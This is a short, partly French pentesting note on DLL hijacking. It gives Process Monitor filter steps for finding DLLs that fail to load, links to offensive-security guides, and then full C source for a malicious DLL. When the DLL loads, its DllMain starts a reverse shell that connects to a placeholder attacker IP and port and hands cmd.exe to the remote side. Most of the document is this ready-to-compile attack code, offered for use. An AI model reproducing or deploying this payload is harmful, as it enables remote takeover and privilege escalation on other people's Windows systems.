DLL Hijacking remote shell

Process Monitor can be used to track down failed DLL loadings in the system. Here’s how to do it step by step:

 

Download Process Monitor from this official link.

https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

 

Unzip the file.

Click on “pocmon.exe”.

After that you will see various processes going on. Click the blue filter button in the top left.

You need to add two filters. The first one is “Result is NAME NOT FOUND Include” and the second one is “PATH ends with .dll Include”

 

 

Other ressources:

https://book.hacktricks.xyz/v/fr/windows-hardening/windows-local-privilege-escalation

https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8

https://le-guide-du-secops.fr/2021/01/04/pentester-votre-domaine-active-directory-avec-crackmapexec/

 

Remote Shell + Priv Escalation via DLL - C

 

#include <winsock2.h>

#include <windows.h>

 

#pragma comment(lib, "ws2_32.lib") // linker directive

 

#define ATTACKER_IP "0.0.0.0" // IP de l'attaquant

#define ATTACKER_PORT 0 // Port de l'attaquant

 

// Fonction qui sera appelée lors du chargement de la DLL

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)

{

    switch (fdwReason)

    {

        case DLL_PROCESS_ATTACH: // Lorsque la DLL est attachée au processus

            // Créer un thread qui exécute le reverse shell

            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShell, NULL, 0, NULL);

            break;

    }

    return TRUE;

}

 

// Fonction qui exécute le reverse shell

void ReverseShell()

{

    WSADATA wsaData;

    SOCKET s;

    struct sockaddr_in sa;

    STARTUPINFO si;

    PROCESS_INFORMATION pi;

 

    // Initialiser Winsock

    WSAStartup(MAKEWORD(2, 2), &wsaData);

 

    // Créer un socket TCP

    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

 

    // Définir l'adresse et le port de l'attaquant

    sa.sin_family = AF_INET;

    sa.sin_port = htons(ATTACKER_PORT);

    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);

 

    // Se connecter à l'attaquant

    WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);

 

    // Rediriger les entrées et sorties standard vers le socket

    memset(&si, 0, sizeof(si));

    si.cb = sizeof(si);

    si.dwFlags = STARTF_USESTDHANDLES;

    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

 

    // Exécuter la commande "cmd.exe"

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

 

    // Attendre la fin du processus

    WaitForSingleObject(pi.hProcess, INFINITE);

 

    // Fermer le socket et Winsock

    closesocket(s);

    WSACleanup();

}

 

